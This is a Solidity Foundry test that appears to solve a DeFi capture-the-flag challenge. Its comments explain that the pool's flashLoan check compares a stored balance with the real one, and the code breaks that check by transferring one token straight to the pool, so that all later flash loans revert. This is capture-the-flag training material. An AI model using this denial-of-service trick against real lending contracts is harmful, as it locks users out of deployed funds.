// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FlashPoolFixture.sol";

contract FlashPoolTest is FlashPoolFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_flashPool() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
        /*
            ---- We need to stop the pool from executing flash loans ----
            In the flashLoan function line 35, it checks if the poolBalance == the balance of the contract before the flash loan
            However, the variable poolBalance only gets updated on the depositTokens function
            So, if we just sent 1 DefiCtfToken to the contract without using this function it wont pass the assert
        */
        token.transfer(address(pool), 1);

        // Stop acting like the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Expect the FlashPoolLender to revert on all flash loans
        vm.expectRevert();
        vm.prank(user);
        receiver.executeFlashLoan(10);
    }
}